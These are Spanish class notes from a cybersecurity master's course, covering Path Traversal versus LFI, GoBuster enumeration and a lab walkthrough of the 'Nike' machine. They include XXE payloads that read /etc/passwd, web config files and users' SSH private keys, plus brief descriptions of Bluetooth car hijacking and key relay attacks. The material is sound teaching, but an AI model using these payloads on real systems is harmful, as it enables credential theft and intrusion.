> [!info] Ficha técnica
> **Máster de Ciberseguridad e Inteligencia Artificial** · **Clase 43**
> **Módulo:** MODULO3
> **Tema:** Clase 43
> **Fuente:** Apuntes Joselu · Evolve Academy

> [!tip] Cómo leer estos apuntes
> Resumen estructurado de la clase 43. Contenido optimizado para estudio activo y repaso rápido antes de exámenes.

---

---

--
**Máster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy**

## 1.

Contexto y estructura de la sesión

Esta sesión la imparte **Carlos (Dani)**.

La dinámica es mixta: dos alumnos (Manu y Óscar) van resolviendo las máquinas en pantalla compartida mientras Carlos interviene para consolidar conceptos y corregir el razonamiento.

La clase tiene un alto contenido teórico-conceptual intercalado con la práctica.

**Estado de las máquinas al inicio:** - **Nike** (HackerLabs): terminada la primera parte hasta RCE como `www-data`.

Pendiente escalada de privilegios. - **Castor** (HackerLabs): pendiente desde cero.

**Regla de convivencia:** Carlos hace una advertencia explícita sobre competitividad tóxica entre alumnos --- el primero en ser pillado faltando el respeto a un compañero pierde una semana de clase, el segundo un mes, y el tercero es expulsado.

## 2.

La distinción definitiva: Path Traversal vs.

LFI

Carlos cierra el debate que quedó abierto en clases anteriores con una explicación que duró 15 años en entender él mismo:

### Path Traversal --- la vulnerabilidad

**Path Traversal** es la **vulnerabilidad** en sí.

Consiste en que un parámetro acepta la secuencia `../` y no la filtra, permitiendo navegar fuera del directorio autorizado.

### El problema: el Path Traversal de por sí solo no se puede **evidenciar** ni verificar.

Si metes `../../../../` en un campo, ¿cómo sabes que ha funcionado?

No ves nada.

### LFI --- la consecuencia que demuestra el Path Traversal

**LFI** (*Local File Inclusion*) es la **consecuencia** del Path Traversal.

Es lo que permite **leer un fichero** usando la vulnerabilidad del Path Traversal --- y lo que convierte la vulnerabilidad de "posible" a "confirmada".

No puedes verificar la existencia del Path Traversal sin el LFI, porque el LFI es lo que te devuelve el contenido del fichero y demuestra que has salido del directorio permitido.

Path Traversal (vulnerabilidad) → habilita → LFI (consecuencia/evidencia)

**La metáfora definitiva:** \> "Yo voy a tu casa y veo el escritorio en la parte de arriba (carpeta web).

No tengo visibilidad del cajón de abajo (carpeta anterior).

Para abrir el cajón necesito la llave --- eso es el Path Traversal.

Pero para demostrar que lo he abierto, tengo que leer lo que hay dentro --- eso es el LFI.

Además, el diario que hay dentro (el fichero) debería tener el candado puesto (permisos `r` solo para el owner/group), pero se ha dejado accesible para `others`."

### La regla práctica

- Si tienes Path Traversal → **tienes automáticamente LFI**.
- Sin Path Traversal no hay LFI.
- El LFI no existe sin Path Traversal.
- Ambos términos no son intercambiables --- uno es la causa y el otro es el efecto.

## 3.

Qué puede leer www-data (y qué no)

Cuando se explota una vulnerabilidad web, el código PHP se ejecuta como la cuenta de servicio del servidor web: `www-data` (en Apache/Nginx sobre Linux).

### Qué ficheros puede leer www-data

Puede leer cualquier fichero del sistema donde `others` **tenga permiso de lectura (**`r`**)**.

Esto incluye por defecto: `/etc/passwd`, `/etc/hostname`, la mayoría de ficheros de configuración del sistema.

**Lo que NO puede leer:** ficheros con permisos restrictivos --- `/etc/shadow` (solo root y grupo shadow), claves privadas SSH de otros usuarios, etc.

# Los ficheros que www-data puede leer:

```bash
ls -la /etc/passwd # → -rw-r--r-- (others tiene r) → LEGIBLE ls -la /etc/shadow # → -rw-r----- (others sin r) → NO LEGIBLE
```

### La defensa teórica contra LFI (aunque en la práctica es "una guarrada")

Si una aplicación tiene un LFI inevitable por necesidades de negocio, la forma de mitigarlo es:

1. **Quitar permisos de lectura a** `www-data` **sobre todos los ficheros del sistema** (excepto los propios de la web). 2. **Añadir inmutabilidad** a los ficheros del sistema con `chattr +i` → ni siquiera root puede cambiar los permisos.

Resultado: `www-data` puede leer los ficheros de la carpeta web, pero no puede navegar fuera de ella aunque tenga Path Traversal.

**Por qué es** "**una guarrada**"**:** el servidor quedaría prácticamente inutilizable para cualquier funcionalidad que requiera acceder a otros recursos del sistema.

En la práctica, nadie hace esto --- es un ejercicio conceptual para entender los permisos.

## 4.

El error 500 como señal de interacción con el backend

**Código HTTP 500 = Internal Server Error.**

¿Cuándo ocurre?

Cuando la petición que mandamos al servidor **rompe algo internamente** --- la petición llega al backend, lo toca, y algo falla.

**Por qué es útil para un auditor:** - Un 500 confirma que **hemos interactuado con el backend** (la petición no fue ignorada o bloqueada). - Si metemos una comilla simple `'` en un campo y obtenemos 500 → la comilla rompe una query SQL → **SQLi confirmada**. - Si mandamos texto plano a un endpoint que espera XML y obtenemos 500 → el endpoint parsea XML → **candidato a XXE**.

### Qué códigos incluir en los escaneos

Carlos recomienda **incluir los 500 en GoBuster** porque un 500 en un directorio significa "existe y hace algo cuando lo tocomás":

# Incluir códigos que nos interesan, excluir los que no

gobuster dir -u http://URL -w diccionario \
 -s "200,301,302,500" \
 -b "" # Blacklist vacía (quita el 404 por defecto)

**Tabla de códigos:**

Código Significado ¿Nos interesa?
 --------- ------------------------------------------------------ ---------------
200 OK --- existe y devuelve contenido ✅ Sí 301/302 Redirect --- nos dice la nueva URL ✅ Sí 403 Forbidden --- existe pero sin acceso ⚠️ Depende 404 Not Found --- no existe ❌ No 500 Internal Server Error --- existe, interactúa y falla ✅ Sí

## 5.

Regla Apache/Linux vs.

IIS/.NET/Windows

Una regla práctica para identificar el sistema operativo sin lanzar `ping`:

Web server Sistema operativo Directorio raíz por defecto
 -------------------- ------------------- ----------------------------
 **Apache / Nginx** Linux `/var/www/html/`
 **IIS** Windows `C:\inetpub\wwwroot\`
 **.NET** Windows (ASP.NET + IIS)

**La regla práctica:** si ves Apache en las cabeceras → es Linux.

Si ves IIS o .NET → es Windows.

**Confirmación adicional desde Burp:** si en la respuesta HTTP aparece `Server: Apache/2.4.x (Debian)` --- confirmado Linux.

**Por qué importa para el LFI:** en Linux leemos `/etc/passwd`; en Windows leemos `C:\Windows\System32\drivers\etc\hosts` o `C:\Users\nombre\Desktop\flag.txt`.

Paths completamente diferentes.

## 6.

La jerarquía de enumeración web (formalizada)

Carlos vuelve a repasar la jerarquía que hay que seguir siempre:

## 1.

Directorios → GoBuster sin -x (busca carpetas) ↓ 2.

Ficheros → GoBuster con -x php,html,txt,xml,js,zip (busca ficheros) ↓ 3.

Parámetros → Burp / DevTools / FFUF (¿qué acepta este endpoint?) ↓ 4.

Variables → Fusear los valores de los parámetros encontrados

**Regla:** no saltar al nivel 4 sin haber pasado por el 1, 2 y 3.

Si saltamos a "probar XMLs" antes de saber si el endpoint existe, estamos dando palos de ciego.

**Dato práctico:** el fichero `datos.php` de la máquina Nike devolvía 500 para cualquier petición.

No descartarlo --- guardarlo como "existe y hace algo" y continuar enumerando.

## 7.

Máquina Nike --- Flujo hasta RCE + razonamiento del por qué

### Reconocimiento

```bash
sudo netdiscover -r 10.0.2.0/24 nmap -sCV --open IP -oA nike
```

Puertos: 22 (SSH) y 80 (HTTP, Apache 2.4.62).

### Fuzzing en dos fases

# Fase 1: directorios

gobuster dir -u http://IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
 -s "200,301,302,500" -b ""

# Fase 2: ficheros con extensiones

gobuster dir -u http://IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
 -x php,html,txt,xml,js,zip \
 -s "200,301,302,500" -b ""

**Hallazgos:** - `/uploads/` → accesible (200).

La condición de ejecución ya está confirmada. - `upload.php` → formulario de subida. - `datos.php` → devuelve 500 (existe, interactúa, falla con cualquier payload).

### Análisis de upload.php con Burp Repeater

**1.

Primera petición vacía:** el servidor devuelve `"No proporcionado"` o similar → espera algo.

**2.

Payload de texto arbitrario:** el servidor devuelve `start tag expected` → espera XML (etiquetas).

**3.

Payload XML básico:**

<?xml version="1.0"?> <test>hola</test>

El servidor procesa el XML → **candidato a XXE confirmado**.

**4.

Payload XXE:**

<?xml version="1.0"?> <!DOCTYPE nota [ <!ENTITY backdoor SYSTEM "file:///etc/passwd"> ]> <nota> &backdoor; </nota>

**Resultado:** el servidor devuelve el contenido del `/etc/passwd` → **LFI via XXE confirmado**.

**Por qué se llama backdoor a la entidad:** Carlos usa "backdoor" como nombre de variable para diferenciarlo del nombre del fichero y ser descriptivo del propósito.

El nombre de la entidad puede ser cualquier cosa.

### Qué leer después de confirmar el LFI

Prioridad de ficheros a leer con el payload XXE:

<!-- Usuarios del sistema --> <!ENTITY x SYSTEM "file:///etc/passwd">

<!-- Fichero de configuración de la web (credenciales de DB) --> <!ENTITY x SYSTEM "file:///var/www/html/config.php"> <!ENTITY x SYSTEM "file:///var/www/html/datos.php">

<!-- Clave privada SSH de un usuario --> <!ENTITY x SYSTEM "file:///home/USUARIO/.ssh/id_rsa">

## 8.

Concepto: "datos.php" --- un endpoint no descartable aunque devuelva 500

**Razonamiento del profesor:**

Si `datos.php` devuelve 500 con cualquier payload, significa: - El fichero existe en el servidor. - El servidor lo procesa (lo "toca"). - La petición llega al backend pero el servidor no sabe qué hacer con lo que enviamos.

**No descartarlo** --- simplemente no conocemos el formato correcto todavía.

Una vez dentro del sistema (via SSH o reverse shell), podremos leer el código fuente de `datos.php` y ver exactamente qué espera.

## 9.

Hacking Bluetooth y de vehículos --- tangentes técnicas de la clase

Durante la clase hubo una larga tangente técnica sobre hacking fuera de la web.

Los temas mencionados con suficiente detalle técnico para el resumen:

**Hacking de coches por Bluetooth:** - Los móviles se conectan a la centralita del coche via Bluetooth. - La centralita se comunica con el CAN Bus (bus de datos del vehículo). - El OBD (*On-Board Diagnostics*) permite acceder al CAN Bus. - Con una antena Bluetooth (UberTooth) se pueden interceptar los paquetes del CAN Bus. - Un ataque de **session hijacking BLE** permite suplantar el dispositivo conectado y enviar comandos al coche --- incluyendo frenar en seco.

**Referencia:** artículo "*Sexting Hacking*" / artículo Forbes sobre hacking de vehículos con BLE.

**Protocolo de llaves de coches y relay attack:** - Las llaves de coches modernos usan intercambio de claves rotativas por radio. - Si se intercepta la petición de rotación de clave y se elimina (*packet dropping*), la llave se queda con la clave anterior para siempre. - Se puede simular esa clave con un cable jack de auriculares + pinza de la ropa (receptor de radiofrecuencia casero). - Este ataque permitió robar BMWs en Alemania en 2023.

**Flipper Zero:** dispositivo de hacking de hardware que puede emitir señales de radio, NFC, Bluetooth y más --- mencionado como herramienta para replicar este tipo de ataques.

**Hacking de satélites:** Carlos mencionó haber pasado a un becario un artículo sobre hacking de satélites antiguos (con CPUs tipo Pentium 2) usando antenas.

Iniciativa de Starlink de CPDs espaciales en 2030 con comunicación por pulsos láser.

## 10.

Conceptos y términos clave corregidos

Término en la transcripción Corrección / Aclaración
--------------------------------------------------------------- ----------------------------------------------------------------------------------------------------------------------------------------
*Local file plus / local fenling Plus / local five inclusing* **LFI** (*Local File Inclusion*) -- consecuencia del Path Traversal; lectura de ficheros locales del servidor
*Transversal Paz / pad transversal / Past transversal* **Path Traversal** -- vulnerabilidad base que permite navegar fuera del directorio autorizado con `../`
 *XXI / XX E / X equis E* **XXE** (*XML External Entity Injection*) -- inyección de entidades externas en XML para conseguir LFI
*datos punto PHP / la 500 / el PHP que rompe* `datos.php` -- endpoint de la máquina Nike que devuelve 500 con cualquier payload; existe pero no conocemos su formato
*la backdoor de la entidad* **Nombre de la entidad XXE** -- en los payloads XXE, el nombre de la entidad puede ser cualquier cosa (ej. `backdoor`, `jefe`, `x`)
 *W W Data / ww guión data / el usurario del Apache* `www-data` -- cuenta de servicio de Apache/Nginx en Linux; ejecuta el código PHP de la web
 *inmutabilidad / le metemos inmutable* **Inmutabilidad** (`chattr +i`) -- atributo de fichero que impide modificaciones ni con root
 *others / los de outs / oders* `others` -- tercer grupo de permisos Linux (cualquier usuario que no sea owner ni del grupo)
*código 500 / la 500 / el 500* **HTTP 500 Internal Server Error** -- el servidor procesó la petición pero algo falló internamente; señal de interacción con el backend
 *código 200 / la 200* **HTTP 200 OK** -- el servidor devuelve el recurso correctamente
 *código 301 / la 301* **HTTP 301 Moved Permanently** -- redirect permanente; indica la nueva URL
 *blacklist vacía / guion B vacío* `-b ""` -- flag de GoBuster para dejar la blacklist vacía y no filtrar el 404 por defecto
 *guión S / la S de los status codes* `-s "200,301,500"` -- flag de GoBuster para especificar qué códigos de respuesta incluir
 *IIS / punto NET / el de Windows* **IIS + .NET** -- servidor web de Microsoft para Windows; equivalente a Apache+PHP en Linux
 *barra var barra www barra HTML* `/var/www/html/` -- directorio raíz por defecto de Apache en Linux
 *Bluetooth LE / BLE* **BLE** (*Bluetooth Low Energy*) -- protocolo Bluetooth de bajo consumo; usado en IoT y vehículos
 *CAN Bus / campus / canber* **CAN Bus** (*Controller Area Network*) -- bus de comunicaciones interno de los vehículos
 *OBD / el OVD / el conector del coche* **OBD** (*On-Board Diagnostics*) -- puerto de diagnóstico de vehículos; puerta de entrada al CAN Bus
 *Uber Tooth / la antena de BLE* **UberTooth** -- dispositivo hardware para capturar y analizar tráfico Bluetooth
 *Flipper 0 / Flipper zero* **Flipper Zero** -- herramienta de hacking de hardware (radio, NFC, Bluetooth, infrarrojos, RFID)
*el relay attack / el bug del BMW* **Relay attack** -- ataque que intercepta la señal de la llave del coche y la retransmite para abrir o arrancar el vehículo
 *Claudia / Claude / La IA* **Claude** (Anthropic) -- IA usada por los alumnos para resolver dudas y generar payloads durante la clase

*Resumen elaborado para uso académico en el Máster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy.*



---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[resumen_master_clase45.md|resumen_master_clase45]] — GoBuster, IA en Ciberseguridad, Linux
- [[../../transcripciones/Julio/14.07.2026 Fundamentos Web y SQL Injection Máquina Injected (HackerLab).md|14.07.2026 Fundamentos Web y SQL Injection Máquina Injected (HackerLab)]] — GoBuster, IA en Ciberseguridad, Linux
- [[../../apuntes Andres/09.07.2026 XXE - XML External Entity y Máquina Castor.md|09.07.2026 XXE - XML External Entity y Máquina Castor]] — GoBuster, IA en Ciberseguridad, Linux
- [[../../write-ups/Inj3ctCrew-THL.md|Inj3ctCrew-THL]] — GoBuster, Linux, Metasploit
- [[resumen_master_clase35.md|resumen_master_clase35]] — IA en Ciberseguridad, Linux, Windows
- [[../../transcripciones/Julio/08.07.2026 Owasp Top 10 LFI Fundamentos.md|08.07.2026 Owasp Top 10 LFI Fundamentos]] — IA en Ciberseguridad, Linux, Windows

### 🛠️ Herramientas

- [[comandos/BurpSuite|Burp Suite]]
- [[comandos/FFUF|FFUF]]
- [[comandos/GoBuster|GoBuster]]
- [[comandos/Metasploit|Metasploit]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]
- [[Apuntes/05 - Auditoria Web/Path Traversal — 6 Casos y Bypasses.md|Path Traversal / LFI]]
- [[Apuntes/05 - Auditoria Web/SQL Injection.md|SQL Injection]]
- [[Apuntes/05 - Auditoria Web/XXE — XML External Entity.md|XXE]]

> #burpsuite #command-injection #escalada-privilegios #ffuf #gobuster #ia #lfi #linux #metasploit #netcat #post-explotacion #redes #reverse-shell #sqli #ssh #windows #xxe
